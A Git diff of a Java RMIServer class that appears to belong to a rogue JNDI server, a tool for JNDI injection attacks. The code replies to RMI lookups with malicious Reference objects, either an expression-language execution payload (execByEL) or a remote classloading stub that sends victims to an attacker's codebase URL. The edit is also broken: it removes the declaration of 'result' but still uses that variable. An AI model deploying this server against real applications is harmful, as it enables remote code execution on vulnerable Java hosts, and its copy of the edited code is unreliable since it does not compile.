@@ -284,7 +284,6 @@ public class RMIServer implements Runnable {
 
     }
 
-
     private boolean handleRMI(ObjectInputStream ois, DataOutputStream out) throws Exception {
         int method = ois.readInt(); // method
         ois.readLong(); // hash
@@ -306,7 +305,7 @@ public class RMIServer implements Runnable {
         System.out.println(ansi().render(Ltime.getLocalTime() + "@|bg_GREEN -----------------------------------------------------------------------------------|@"));
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Is RMI.lookup call for >> |@" + base + " " + method));
 
-        InMemoryInterceptedSearchResult result = null;
+
         LdapController controller = null;
         //find controller
         //根据请求的路径从route中匹配相应的controller
@@ -336,12 +335,14 @@ public class RMIServer implements Runnable {
                 System.out.println("[+] Sending local classloading reference.");
                 Reflections.setFieldValue(rw, "wrappee", execByEL());
             } else {
-                System.err.println(
-                        String.format(
-                                "[+] Sending remote classloading stub targeting %s",
-                                turl));
-
-                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", turl.getRef(), turl.toString()));
+//                System.err.println(
+//                        String.format(
+//                                "[+] Sending remote classloading stub targeting %s",
+//                                turl));
+//
+//                Reflections.setFieldValue(rw, "wrappee", new Reference("Foo", turl.getRef(), turl.toString()));
+                controller.process(base);
+                controller.sendResult(result, base);
             }
             Field refF = RemoteObject.class.getDeclaredField("ref");
             refF.setAccessible(true);
